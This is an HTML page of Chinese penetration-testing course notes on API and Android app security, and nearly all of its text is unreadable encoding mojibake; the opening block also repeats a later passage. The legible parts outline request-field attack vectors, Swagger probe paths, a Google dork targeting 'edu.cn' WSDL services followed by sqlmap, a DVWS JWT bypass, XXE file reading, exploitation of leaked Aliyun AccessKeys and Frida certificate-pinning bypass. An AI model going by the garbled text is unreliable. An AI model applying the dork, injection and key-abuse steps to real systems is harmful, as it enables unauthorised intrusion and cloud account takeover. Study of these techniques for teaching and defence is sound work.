<h4 id="æ¥å£æ•°æ®åŒ…ï¼š"><a href="#æ¥å£æ•°æ®åŒ…ï¼š" class="headerlink" title="æ¥å£æ•°æ®åŒ…ï¼š"></a>æ¥å£æ•°æ®åŒ…ï¼š</h4><p>Method:è¯·æ±‚æ–¹æ³•<br>æ”»å‡»æ–¹å¼ï¼šOPTIONS,PUT,MOVE,DELETE<br>æ•ˆæœï¼šä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œä¿®æ”¹é¡µé¢ç­‰<br>URL:å”¯ä¸€èµ„æºå®šä½ç¬¦<br>æ”»å‡»æ–¹å¼ï¼šçŒœæµ‹ï¼Œéå†ï¼Œè·³è½¬<br>æ•ˆæœï¼šæœªæˆæƒè®¿é—®ç­‰<br>Params:è¯·æ±‚å‚æ•°<br>æ”»å‡»æ–¹å¼ï¼šæ„é€ å‚æ•°ï¼Œä¿®æ”¹å‚æ•°ï¼Œéå†ï¼Œé‡å‘<br>æ•ˆæœï¼šçˆ†ç ´ï¼Œè¶Šæƒï¼Œæœªæˆæƒè®¿é—®ï¼Œçªç ´ä¸šåŠ¡é€»è¾‘ç­‰<br>Authorization:è®¤è¯æ–¹å¼<br>æ”»å‡»æ–¹å¼ï¼šèº«ä»½ä¼ªé€ ï¼Œèº«ä»½ç¯¡æ”¹<br>æ•ˆæœï¼šè¶Šæƒï¼Œæœªæˆæƒè®¿é—®ç­‰<br>Headers:æ¸…æ±‚æ¶ˆæ¯å¤´<br>æ”»å‡»æ–¹å¼ï¼šæ‹¦æˆªæ•°æ®åŒ…ï¼Œæ”¹Hosts,<br>æ”¹Referer,æ”¹Content-Typeç­‰<br>æ•ˆæœï¼šç»•è¿‡èº«ä»½è®¤è¯ï¼Œç»•è¿‡RefereréªŒè¯ï¼Œç»•è¿‡ç±»å‹éªŒè¯ï¼ŒDDOSç­‰<br>Body:æ¶ˆæ¯ä½“<br>æ”»å‡»æ–¹å¼ï¼šSQLæ³¨å…¥ï¼ŒXMLæ³¨å…¥ï¼Œååºåˆ—åŒ–ç­‰<br>æ•ˆæœï¼šææƒï¼Œçªç ´ä¸šåŠ¡é€»è¾‘ï¼Œæœªæˆæƒè®¿é—®ç­‰</p>
<p>å®‰å…¨é—®é¢˜ï¼š<br>XSSè·¨ç«™ï¼Œä¿¡æ¯æ³„éœ²ï¼Œæš´åŠ›ç ´è§£ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œæœªæˆæƒè®¿é—®ï¼ŒJWTæˆæƒè®¤è¯ï¼Œæ¥å£æ»¥ç”¨ç­‰</p>
<p>æ¼”ç¤ºæ¡ˆä¾‹ï¼š<br>WebService:ç±»-Wsdl&amp;ReadyAP-SQLæ³¨å…¥<br>SOAPç±»-Swagger&amp;SoapUla&amp;EXP-ä¿¡æ¯æ³„éœ²<br>HTTPç±»-WebPack&amp;PackerFuzzer-ä¿¡æ¯æ³„éœ²</p>
<p>WebService-Wsdl&amp;SoapUl<br>æ¢é’ˆï¼š?wsdl<br>åˆ©ç”¨ï¼šSoapUla&amp;ReadyAPI<br>æ€è·¯ï¼šä½¿ç”¨googlehackè¯­æ³•æŸ¥æ‰¾å¯èƒ½å«æœ‰æ¼æ´çš„èµ„äº§ edu.cn inurl:asmx?wsdl<br>ä½¿ç”¨å·¥å…·readyAPIè¿›è¡Œæ‰«æâ€”æ‰«æå‡ºå­˜åœ¨sqlæ³¨å…¥â€“sqlmapä¸€æŠŠæ¢­</p>
<p>SOAP-Swagger&amp;SoapUl&amp;EXP<br>æ¢é’ˆï¼šç›®å½•&amp;Sèµ„æº<br>åˆ©ç”¨ï¼šSoapUla&amp;EXP<br><a href="https://github.com/lijiejie/swagger-exp">https://github.com/lijiejie/swagger-exp</a><br><a href="https://github.com/jayus0821/swagger-hack">https://github.com/jayus0821/swagger-hack</a><br>ç›®å½•:<br>&#x2F;swagger<br>&#x2F;api&#x2F;swagger<br>&#x2F;swagger&#x2F;ui<br>&#x2F;api&#x2F;swagger&#x2F;ui<br>&#x2F;swagger-ui.html<br>&#x2F;api&#x2F;swagger-ui.html<br>&#x2F;user&#x2F;swagger-ui.html<br>&#x2F;libs&#x2F;swaggerui<br>&#x2F;api&#x2F;swaggerui<br>&#x2F;swagger-resources&#x2F;configuration&#x2F;ui<br>&#x2F;swagger-resources&#x2F;configuration&#x2F;security<br>æ€è·¯åŒä¸Š ä½¿ç”¨swagger-hack.pyè„šæœ¬</p>
<p>#HTTP-Webpack&amp;PackerFuzzer<br>æ¢é’ˆï¼šæ’ä»¶&amp;JSèµ„æº<br>åˆ©ç”¨ï¼šPackerFuzzer<br><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p>
<h1 id="ç¬¬66å¤©-APIå®‰å…¨-æ¥å£å®‰å…¨-é˜¿é‡Œäº‘KEY-postman-DVWS-XEE-é‰´æƒ-æ³„éœ²"><a href="#ç¬¬66å¤©-APIå®‰å…¨-æ¥å£å®‰å…¨-é˜¿é‡Œäº‘KEY-postman-DVWS-XEE-é‰´æƒ-æ³„éœ²" class="headerlink" title="ç¬¬66å¤© APIå®‰å…¨-æ¥å£å®‰å…¨&amp;é˜¿é‡Œäº‘KEY%postman&amp;DVWS&amp;XEE&amp;é‰´æƒ&amp;æ³„éœ²"></a>ç¬¬66å¤© APIå®‰å…¨-æ¥å£å®‰å…¨&amp;é˜¿é‡Œäº‘KEY%postman&amp;DVWS&amp;XEE&amp;é‰´æƒ&amp;æ³„éœ²</h1><p>çŸ¥è¯†ç‚¹<br>1.HTTPç±»æ¥å£-æµ‹è¯„<br>2.RPCç±»æ¥å£-æµ‹è¯„<br>3.Web Serviceç±»-æµ‹è¯„<br>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.jianshu.com/p/e48db27d7c70">https://www.jianshu.com/p/e48db27d7c70</a></p>
<p>å†…å®¹ç‚¹ï¼š<br>SOAP(Simple Object Access Protocol)ç®€å•å¯¹è±¡è®¿é—®åè®®æ˜¯äº¤æ¢æ•°æ®çš„ä¸€ç§åè®®è§„èŒƒï¼Œ<br>æ˜¯ä¸€ç§è½»é‡çš„ã€ç®€å•çš„ã€åŸºäºXMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ä¸‹çš„ä¸€ä¸ªå­é›†ï¼‰çš„åè®®ï¼Œå®ƒè¢«è®¾è®¡<br>æˆåœ¨WEBä¸Šäº¤æ¢ç»“æ„åŒ–çš„å’Œå›ºåŒ–çš„ä¿¡æ¯ï¼ŒSOAPä¸æ˜¯Web Servicetçš„ä¸“æœ‰åè®®ï¼Œ<br>SOAPä½¿ç”¨HTTPæ¥å‘é€XMLæ ¼å¼çš„æ•°æ®ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºï¼šSOAP&#x3D;HTTP+XML</p>
<p>REST(Representational State Transfer)å³è¡¨è¿°æ€§çŠ¶æ€ä¼ é€’ï¼Œåœ¨ä¸‰ç§ä¸»æµçš„WebæœåŠ¡å®<br>ç°æ–¹æ¡ˆä¸­ï¼Œå› ä¸ºRESTæ¨¡å¼çš„WbæœåŠ¡ä¸å¤æ‚çš„SOAPå’ŒXML-RPCå¯¹æ¯”æ¥è®²æ˜æ˜¾çš„æ›´åŠ ç®€<br>æ´ï¼Œè¶Šæ¥è¶Šå¤šçš„WebæœåŠ¡å¼€å§‹é‡‡ç”¨RESTé£æ ¼è®¾è®¡å’Œå®ç°ã€‚ä¾‹å¦‚ï¼ŒAmazon.comæä¾›æ¥è¿‘<br>RESTé£æ ¼çš„WebæœåŠ¡è¿›è¡Œå›¾ä¹¦æŸ¥æ‰¾ï¼›é›…è™æä¾›çš„WebæœåŠ¡ä¹Ÿæ˜¯RESTé£æ ¼çš„ã€‚</p>
<p>WSDL(Web Services Description Language)å³ç½‘ç»œæœåŠ¡æè¿°è¯­è¨€ï¼Œç”¨äºæè¿°WebæœåŠ¡<br>çš„å…¬å…±æ¥å£ã€‚è¿™æ˜¯ä¸€ä¸ªåŸºäºXMLçš„å…³äºå¦‚ä½•ä¸WbæœåŠ¡é€šè®¯å’Œä½¿ç”¨çš„æœåŠ¡æè¿°ï¼›ä¹Ÿå°±æ˜¯æ<br>è¿°ä¸ç›®å½•ä¸­åˆ—å‡ºçš„WbæœåŠ¡è¿›è¡Œäº¤äº’æ—¶éœ€è¦ç»‘å®šçš„åè®®å’Œä¿¡æ¯æ ¼å¼ã€‚é€šå¸¸é‡‡ç”¨æŠ½è±¡è¯­è¨€æ<br>è¿°è¯¥æœåŠ¡æ”¯æŒçš„æ“ä½œå’Œä¿¡æ¯ï¼Œä½¿ç”¨çš„æ—¶å€™å†å°†å®é™…çš„ç½‘ç»œåè®®å’Œä¿¡æ¯æ ¼å¼ç»‘å®šç»™è¯¥æœåŠ¡ã€‚</p>
<p>æ¥å£æ•°æ®åŒ…ï¼š<br>Method:è¯·æ±‚æ–¹æ³•<br>æ”»å‡»æ–¹å¼ï¼šOPTIONS,PUT,MOVE,DELETE<br>æ•ˆæœï¼šä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œä¿®æ”¹é¡µé¢ç­‰<br>URL:å”¯ä¸€èµ„æºå®šä½ç¬¦<br>æ”»å‡»æ–¹å¼ï¼šçŒœæµ‹ï¼Œéå†ï¼Œè·³è½¬<br>æ•ˆæœï¼šæœªæˆæƒè®¿é—®ç­‰<br>Params:è¯·æ±‚å‚æ•°<br>æ”»å‡»æ–¹å¼ï¼šæ„é€ å‚æ•°ï¼Œä¿®æ”¹å‚æ•°ï¼Œéå†ï¼Œé‡å‘<br>æ•ˆæœï¼šçˆ†ç ´ï¼Œè¶Šæƒï¼Œæœªæˆæƒè®¿é—®ï¼Œçªç ´ä¸šåŠ¡é€»è¾‘ç­‰<br>Authorization:è®¤è¯æ–¹å¼<br>æ”»å‡»æ–¹å¼ï¼šèº«ä»½ä¼ªé€ ï¼Œèº«ä»½ç¯¡æ”¹<br>æ•ˆæœï¼šè¶Šæƒï¼Œæœªæˆæƒè®¿é—®ç­‰<br>Headers:æ¸…æ±‚æ¶ˆæ¯å¤´<br>æ”»å‡»æ–¹å¼ï¼šæ‹¦æˆªæ•°æ®åŒ…ï¼Œæ”¹Hosts,<br>æ”¹Referer,æ”¹Content-Typeç­‰<br>æ•ˆæœï¼šç»•è¿‡èº«ä»½è®¤è¯ï¼Œç»•è¿‡RefereréªŒè¯ï¼Œç»•è¿‡ç±»å‹éªŒè¯ï¼ŒDDOSç­‰<br>Body:æ¶ˆæ¯ä½“<br>æ”»å‡»æ–¹å¼ï¼šSQLæ³¨å…¥ï¼ŒXMLæ³¨å…¥ï¼Œååºåˆ—åŒ–ç­‰<br>æ•ˆæœï¼šææƒï¼Œçªç ´ä¸šåŠ¡é€»è¾‘ï¼Œæœªæˆæƒè®¿é—®ç­‰</p>
<p>å®‰å…¨é—®é¢˜ï¼š<br>XSSè·¨ç«™ï¼Œä¿¡æ¯æ³„éœ²ï¼Œæš´åŠ›ç ´è§£ï¼Œæ–‡ä»¶ä¸Šä¼ ï¼Œæœªæˆæƒè®¿é—®ï¼ŒJWTæˆæƒè®¤è¯ï¼Œæ¥å£æ»¥ç”¨ç­‰</p>
<p>æ¼”ç¤ºæ¡ˆä¾‹ï¼š<br>å·¥å…·ä½¿ç”¨-Postmanè‡ªåŠ¨åŒ–æ±‰æµ‹è¯•<br>å®‰å…¨é—®é¢˜-Dvwsæ³„ä¸–æ¼&amp;é‰´æƒ&amp;XE<br>å®‰å…¨é—®é¢˜-é˜¿é‡ŒKEYä¿¡æ¯æ³„æ¼åˆ©ç”¨<br>åº”ç”¨æ–¹å‘-è¿æ³•APPæ‰“åŒ…æ¥å£åˆ†æ</p>
<p>å·¥å…·ä½¿ç”¨-Postmanè‡ªåŠ¨åŒ–æµ‹è¯•<br><a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p>
<h4 id="å®‰å…¨é—®é¢˜-Dvwsä¸–æ˜¯-é‰´æƒ-OXE"><a href="#å®‰å…¨é—®é¢˜-Dvwsä¸–æ˜¯-é‰´æƒ-OXE" class="headerlink" title="å®‰å…¨é—®é¢˜-Dvwsä¸–æ˜¯&amp;é‰´æƒ&amp;OXE"></a>å®‰å…¨é—®é¢˜-Dvwsä¸–æ˜¯&amp;é‰´æƒ&amp;OXE</h4><p><a href="https://github.com/snoopysecurity/dvws-node">https://github.com/snoopysecurity/dvws-node</a><br>1ã€æ³¨å†Œæ—¶æŠ“åŒ…å¯å°è¯•ä¿®æ”¹adminä¸ºtureï¼Œçœ‹çœ‹èƒ½å¦ç»•è¿‡jwtéªŒè¯<br>ç™»å½•è¿”å›çš„æ•°æ®åŒ…ä¸ºadminï¼Œfalse</p>
<p>ä¿®æ”¹ç™»å½•æ•°æ®åŒ…ä¸ºadmin&#x3D;true</p>
<p>2ã€é€šè¿‡æ•°æ®åŒ…ä¸­bodyçš„æ ¼å¼åˆ¤æ–­æäº¤è¯·æ±‚çš„æ ¼å¼ä¸ºxmlæ ¼å¼ï¼Œå°è¯•æ˜¯å¦å­˜åœ¨XXEæ¼æ´ï¼Œåˆ©ç”¨XXEå¯ä»¥å®ç°è¯»å–æ–‡ä»¶ã€è‹¥è¯¯å›æ˜¾å¯ä»¥å°è¯•å¤–éƒ¨å®ä½“æ³¨å…¥æˆ–è€…ä½¿ç”¨dnslogæ£€æµ‹æ¼æ´å­˜åœ¨<br>å¤ç°ï¼šåœ¨ç”¨æˆ·æ•°æ®æœç´¢å‡ºæŠ“åŒ…ï¼Œçœ‹åˆ°æ ¼å¼ä¸ºxmlæ ¼å¼ï¼Œå°è¯•ä½¿ç”¨xxeæ¼æ´è¯»å–åˆ°æ–‡ä»¶</p>
<p>å®‰å…¨é—®é¢˜-é˜¿é‡Œäº‘KEYä¿¡æ¯æ± æ¼åˆ©ç”¨<br><a href="https://yun.cloudbility.com/">https://yun.cloudbility.com/</a><br><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a><br>æ¥å£é…ç½®æ–‡ä»¶æ³„æ¼å¯¼è‡´äº‘èµ„æºç”Ÿæœºå—æ§<br>ç›®å‰ä¸ºæ­¢ï¼Œäº‘æœåŠ¡å™¨å·²ç»å æ®äº†æœåŠ¡å™¨çš„å¤§éƒ¨åˆ†å¸‚åœºï¼Œç”±äºäº‘æœåŠ¡å™¨æ˜“ç®¡ç†ï¼Œæ“ä½œæ€§å¼ºï¼Œå®‰å…¨ç¨‹åº¦é«˜ã€‚å¾ˆå¤šå¤§å‹å‚å•†éƒ½é€‰æ‹©å°†èµ„äº§éƒ¨ç½²åœ¨äº‘æœåŠ¡ä¸Šï¼Œä½†å®‰å…¨çš„åŒæ—¶ç”±äºè¿ç»´äººå‘˜çš„ç–å¿½ä¹Ÿä¼šå¯¼è‡´ä¸€äº›éé¢„æœŸçš„çªç ´å£ã€‚å½“äº‘äº§å“Accesskeyåœ¨è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œå‡ºç°æ³„æ¼ä¼šå¯¼è‡´å¯¹è±¡æ§åˆ¶èµ„æºå…¨éƒ¨è¢«æ§ï¼Œå½±å“ä¸¥é‡ï¼<br>1ã€å¸¸è§„è·å–Accesskeyæ–¹å¼<br>-é€šè¿‡æºç æ³„æ¼é…ç½®æ–‡ä»¶<br>-é€šè¿‡åº”ç”¨ç¨‹åºæŠ¥é”™è¯»å–<br>-é€šè¿‡JSæ–‡ä»¶å¼•ç”¨ä¸­è·å–<br>å¦‚å›¾ï¼šé¡µé¢æŠ¥é”™</p>
<h5 id="åº”ç”¨æ–¹å‘è¿æ³•APPæ‰“åŒ…æ¥å£åˆ†æ"><a href="#åº”ç”¨æ–¹å‘è¿æ³•APPæ‰“åŒ…æ¥å£åˆ†æ" class="headerlink" title="åº”ç”¨æ–¹å‘è¿æ³•APPæ‰“åŒ…æ¥å£åˆ†æ"></a>åº”ç”¨æ–¹å‘è¿æ³•APPæ‰“åŒ…æ¥å£åˆ†æ</h5><p>å®Œæ•´çš„åˆ†ææµç¨‹ï¼šburpæŠ“åŒ…æ‰¾åˆ°çœŸå®è®¿é—®çš„åŸŸååœ°å€â€”é€šè¿‡ä¿¡æ¯æ”¶é›†åˆ°å«æœ‰ä½¿ç”¨webpackç»„ä»¶çš„ç½‘ç«™<br>â€“ä½¿ç”¨&#x2F;Packer-Fuzzerå·¥å…·æ‰«æ</p>
<h1 id="ç¬¬67å¤©-APPæ”»é˜²-Fridaåè¯ä¹¦æŠ“åŒ…-ç§»åŠ¨å®‰å…¨ç³»ç»Ÿ-èµ„äº§æå–-è¯„ä¼°æ‰«æ"><a href="#ç¬¬67å¤©-APPæ”»é˜²-Fridaåè¯ä¹¦æŠ“åŒ…-ç§»åŠ¨å®‰å…¨ç³»ç»Ÿ-èµ„äº§æå–-è¯„ä¼°æ‰«æ" class="headerlink" title="ç¬¬67å¤© APPæ”»é˜²-Fridaåè¯ä¹¦æŠ“åŒ…&amp;ç§»åŠ¨å®‰å…¨ç³»ç»Ÿ&amp;èµ„äº§æå–&amp;è¯„ä¼°æ‰«æ"></a>ç¬¬67å¤© APPæ”»é˜²-Fridaåè¯ä¹¦æŠ“åŒ…&amp;ç§»åŠ¨å®‰å…¨ç³»ç»Ÿ&amp;èµ„äº§æå–&amp;è¯„ä¼°æ‰«æ</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-44"><a href="#çŸ¥è¯†ç‚¹ï¼š-44" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€èµ„äº§ææƒ-AppinfoScanner<br>2ã€è¯„ä¼°æ¡†æ¶-MobSF&amp;mobexler<br>3ã€æŠ“åŒ…åˆ©å™¨-Frida&amp;rOcapture</p>
<h4 id="ç« èŠ‚ç‚¹ï¼š"><a href="#ç« èŠ‚ç‚¹ï¼š" class="headerlink" title="ç« èŠ‚ç‚¹ï¼š"></a>ç« èŠ‚ç‚¹ï¼š</h4><p>1ã€ä¿¡æ¯æ”¶é›†-åº”ç”¨&amp;èµ„äº§æå–&amp;æƒé™ç­‰<br>2ã€æ¼æ´å‘ç°åç¼–è¯‘&amp;è„±å£³&amp;ä»£ç å®¡è®¡<br>3ã€å®‰å…¨è¯„ä¼°-ç»„ä»¶&amp;æ•æ„Ÿå¯†åŒ™&amp;æ¶æ„åˆ†æ</p>
<h4 id="æ ¸å¿ƒç‚¹ï¼š"><a href="#æ ¸å¿ƒç‚¹ï¼š" class="headerlink" title="æ ¸å¿ƒç‚¹ï¼š"></a>æ ¸å¿ƒç‚¹ï¼š</h4><p>0ã€å†…åœ¨ç‚¹èµ„äº§æå–&amp;ç‰ˆæœ¬&amp;ä¿¡æ¯ç­‰<br>1ã€æŠ“åŒ…ç‚¹-åä»£ç†&amp;åè¯ä¹¦&amp;åè®®ç­‰<br>2ã€é€†å‘ç‚¹-åç¼–è¯‘&amp;è„±å£³&amp;é‡æ‰“åŒ…ç­‰<br>3ã€å®‰å…¨ç‚¹èµ„äº§&amp;æ¥å£8æ¼æ´&amp;äº©è®¡ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-38"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-38" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>å†…åœ¨-èµ„äº§æå–-AppinfoScanner<br>å†…åœ¨-å®‰å…¨è¯„ä¼°-MobSF&amp;mobexler<br>å¤–åœ¨-è¯ä¹¦æŠ“åŒ…-Frida-server&amp;rOcapture</p>
<h4 id="å†…åœ¨-èµ„äº§æå–-Appinfoscanner"><a href="#å†…åœ¨-èµ„äº§æå–-Appinfoscanner" class="headerlink" title="å†…åœ¨-èµ„äº§æå–-Appinfoscanner"></a>å†…åœ¨-èµ„äº§æå–-Appinfoscanner</h4><p>Appinfoscannerä¸€æ¬¾é€‚ç”¨äºä»¥HWè¡ŒåŠ¨&#x2F;çº¢é˜Ÿ&#x2F;æ¸—é€æµ‹è¯•å›¢é˜Ÿä¸ºåœºæ™¯çš„ç§»åŠ¨ç«¯(Androidã€<br>iOSã€WEBã€H5ã€é™æ€ç½‘ç«™)ä¿¡æ¯æ”¶é›†æ‰«æå·¥å…·ï¼Œå¯ä»¥å¸®åŠ©æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆã€æ”»å‡»é˜Ÿæˆå‘˜ã€<br>çº¢é˜Ÿæˆå‘˜å¿«é€Ÿæ”¶é›†åˆ°ç§»åŠ¨ç«¯æˆ–å¥¢é™æ€WEBç«™ç‚¹ä¸­å…³é”®çš„èµ„äº§ä¿¡æƒ å¹¶æä¾›åŸºæœ¬çš„ä¿¡æ¯è¾“å‡ºï¼Œ<br>å¦‚ï¼šTitleã€Domainã€CDNã€æ’çº¹ä¿¡æ¯ã€çŠ¶æ€ä¿¡æ¯ç­‰.<br>httpslgithub.com&#x2F;kelvinBen&#x2F;AppinfoScanner</p>
<h4 id="å†…åœ¨-å®‰å…¨è¯„ä¼°-MobsF-mobexler"><a href="#å†…åœ¨-å®‰å…¨è¯„ä¼°-MobsF-mobexler" class="headerlink" title="å†…åœ¨-å®‰å…¨è¯„ä¼°-MobsF&amp;mobexler"></a>å†…åœ¨-å®‰å…¨è¯„ä¼°-MobsF&amp;mobexler</h4><p>ç§»åŠ¨å®‰å…¨æ¡†çˆ†ï¼ˆMobsFï¼‰æ˜¯ä¸€ç§è‡ªåŠ¨åŒ–çš„ä¸€ä½“åŒ–ç§»åŠ¨åº”ç”¨ç¨‹åºï¼ˆAndroidiosWindowsï¼‰æ¸—<br>é€æµ‹è¯•ã€æ¶æ„è½¯ä»¶åˆ†æå’Œå®‰å…¨è¯„ä¼°æ¡†æ¡ˆï¼Œèƒ½å¤Ÿæ‰§è¡Œé™æ€å’ŒåŠ¨æ€åˆ†æï¼ŒMobSFæ”¯æŒç§»åŠ¨åº”ç”¨<br>ç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆAPKã€XAPKã€IPAå’ŒAPPXï¼‰ä»¥åŠå‹ç¼©æºä»£ç ï¼Œå¹¶è§†ä¾›RESTAPIä»¥ä¸<br>æ‚¨çš„CI&#x2F;CDæˆ–DevSecOpsç®¡é“æ— ç¼é›†æˆã€‚åŠ¨æ€åˆ†æå™¨å¯å¸®åŠ©æ‚¨æ‰§è¡Œè¿è¡Œæ—¶å®‰å…¨è¯„ä¼°å’Œäº¤<br>äº’å¼ä»ªå™¨æµè¯•ã€‚<br>-Mobexleræ˜¯åŸºäºElementaryOsçš„å®šåˆ¶è™šæ‹Ÿæœºï¼Œç›²åœ¨å¸¦åŠ©è¿›è¡ŒAndroidå’ŒiOsåº”ç”¨ç¨‹åºçš„æ¸—<br>é€æµ‹è¯•ã€‚Mobexleré¢„è£…äº†å„ç§å¼€æºå·¥å…·ï¼Œè„šæœ¬ï¼Œé»‘å¯†å¿…å¤‡ä»¶ç­‰ï¼Œè¿™äº›éƒ¨æ˜¯å®‰å…¨æµ‹è¯•<br>Androldå’Œiosåº”ç”¨ç¨‹åºæ‰€å¿…éœ€çš„.<br>https:l&#x2F;mobexler.com&#x2F;<br>https:&#x2F;lgithub.com&#x2F;MobsF&#x2F;Mobile-Security-Framework-MobsF<br>dockerpullopensecurity&#x2F;mobile-secunity-framework-mobst<br>docker run -it -p 8008:8000 opensecurity&#x2F;mobile-security-framework-mobsf:latest</p>
<h4 id="å¤–åœ¨-è¯ä¹¦æŠ“åŒ…-frida-server-rocapture"><a href="#å¤–åœ¨-è¯ä¹¦æŠ“åŒ…-frida-server-rocapture" class="headerlink" title="å¤–åœ¨-è¯ä¹¦æŠ“åŒ…-frida-server&amp;rocapture"></a>å¤–åœ¨-è¯ä¹¦æŠ“åŒ…-frida-server&amp;rocapture</h4><p>-r0captureä»…é™å®‰å“å¹³å°ï¼Œæµ‹è¯•å®‰å“7ã€8ã€9ã€10ã€11 å¯ç”¨ ;<br>æ— è§†æ‰€æœ‰è¯ä¹¦æ ¡éªŒæˆ–ç»‘å®šï¼Œä¸ç”¨è€ƒè™‘ä»»ä½•è¯ä¹¦çš„äº‹æƒ…ï¼›<br>é€šæ€TCP&#x2F;På››å±‚æ¨¡å‹ä¸­çš„åº”ç”¨å±‚ä¸­çš„å…¨éƒ¨åè®®ï¼›<br>é€šæ€åè®®åŒ…æ‹¬ï¼šHttp,Websocket,Ftp,Xmpp,Imap,Smtp,Protobuç­‰ã€åŠå®ƒä»¬çš„ssLç‰ˆæœ¬;<br>é€šæ€æ‰€æœ‰åº”ç”¨å±‚æ¡†æ¶ï¼ŒåŒ…æ‹¬HttpUrlConnectionã€Okhttp1&#x2F;3&#x2F;4ã€Retrofit&#x2F;Volleyç­‰ç­‰;<br>æ— è§†åŠ å›ºï¼Œä¸ç®¡æ˜¯æ•´ä½“å£³è¿˜æ˜¯äºŒä»£å£³æˆ–VMPï¼Œä¸ç”¨è€ƒè™‘åŠ å›ºçš„äº‹æƒ…;<br>-Firda æ˜¯ä¸€æ¬¾æ˜“ç”¨çš„è·¨å¹³ Hook å·¥å…·ï¼ŒJava å±‚åˆ° Native å±‚çš„ Hook æ— æ‰€ä¸èƒ½ï¼Œæ˜¯ä¸€ç§ åŠ¨<br>æ€çš„æ’æ¡©å·¥å…·ï¼Œå¯ä»¥æ’å…¥ä»£ç åˆ°åŸç”ŸAppçš„å†…å­˜ç©ºé—´ä¸­ï¼ŒåŠ¨æ€çš„å»ç›‘è§†å’Œä¿®æ”¹è¡Œä¸ºï¼ŒåŸç”Ÿ<br>å¹³å°åŒ…æ‹¬Winã€Macã€Linuxã€Androidã€ioså…¨å¹³å°ã€‚</p>
<p>æµ‹è¯•ç¯å¢ƒï¼š<br>Windows10Python3.7å¤œç¥æ¨¡æ‹Ÿå™¨rocapturefrida-serverwireshark<br><a href="https://lgithub.com/roysue/rocapture">https://lgithub.com/roysue/rocapture</a><br><a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p>
<p>3ã€è½¬å‘å¹¶å¯åŠ¨Frida<br>adbforwardtcp:27042tcp:27042<br>è¿æ¥åˆ¤æ–­: frida-ps-U frida-ps-R<br>4ã€è·å–åŒ…åå¹¶è¿è¡ŒæŠ“åŒ…<br>è·å–åŒ…åï¼šIs&#x2F;data&#x2F;dataæˆ–ApkMessenger<br>python rocapture.py-U -fåŒ…å-p xxxx.pcap</p>
<h1 id="ç¬¬68å¤©-APPæ”»é˜²-Xposed-Frida-Hook-è¯ä¹¦æ ¡éªŒ-åä»£ç†-ä»£ç†è½¬å‘"><a href="#ç¬¬68å¤©-APPæ”»é˜²-Xposed-Frida-Hook-è¯ä¹¦æ ¡éªŒ-åä»£ç†-ä»£ç†è½¬å‘" class="headerlink" title="ç¬¬68å¤© APPæ”»é˜²-Xposed&amp;Frida&amp;Hook&amp;è¯ä¹¦æ ¡éªŒ&amp;åä»£ç†&amp;ä»£ç†è½¬å‘"></a>ç¬¬68å¤© APPæ”»é˜²-Xposed&amp;Frida&amp;Hook&amp;è¯ä¹¦æ ¡éªŒ&amp;åä»£ç†&amp;ä»£ç†è½¬å‘</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-45"><a href="#çŸ¥è¯†ç‚¹ï¼š-45" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€APPé˜²ä»£ç†ç»•è¿‡-åº”ç”¨&amp;è½¬å‘<br>2ã€APPè¯ä¹¦æ ¡éªŒç±»å‹-å•å‘&amp;åŒå‘<br>3ã€APPè¯ä¹¦æ ¡éªŒç»•è¿‡-Frida&amp;XPæ¡†æ¶ç­‰</p>
<h4 id="ç« èŠ‚ç‚¹ï¼š-1"><a href="#ç« èŠ‚ç‚¹ï¼š-1" class="headerlink" title="ç« èŠ‚ç‚¹ï¼š"></a>ç« èŠ‚ç‚¹ï¼š</h4><p>1ã€ä¿¡æ¯æ”¶é›†-åº”ç”¨&amp;èµ„äº§æå–&amp;æƒé™ç­‰<br>2ã€æ¼æ´å‘ç°-åç¼–è¯‘&amp;è„±å£³&amp;ä»£ç å®¡è®¡<br>3ã€å®‰å…¨è¯„ä¼°-ç»„ä»¶&amp;æ•æ„Ÿå¯†åŒ™&amp;æ¶æ„åˆ†æ</p>
<h4 id="æ ¸å¿ƒç‚¹ï¼š-1"><a href="#æ ¸å¿ƒç‚¹ï¼š-1" class="headerlink" title="æ ¸å¿ƒç‚¹ï¼š"></a>æ ¸å¿ƒç‚¹ï¼š</h4><p>0ã€å†…åœ¨ç‚¹-èµ„äº§æå–&amp;ç‰ˆæœ¬&amp;ä¿¡æ¯ç­‰<br>1ã€æŠ“åŒ…ç‚¹-åä»£ç†&amp;åè¯ä¹¦&amp;åè®®ç­‰<br>2ã€é€†å‘ç‚¹-åç¼–è¯‘&amp;è„±å£³&amp;é‡æ‰“åŒ…ç­‰<br>3ã€å®‰å…¨ç‚¹-èµ„äº§&amp;æ¥å£&amp;æ¼æ´&amp;å®¡è®¡ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-39"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-39" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>æŸç‰›ç‰›é˜²æŠ“åŒ…-xposed&amp;frida&amp;rOcapture<br>æŸç¤¾äº¤é˜²æŠ“åŒ…-Proxifier&amp;frida&amp;rocapture</p>
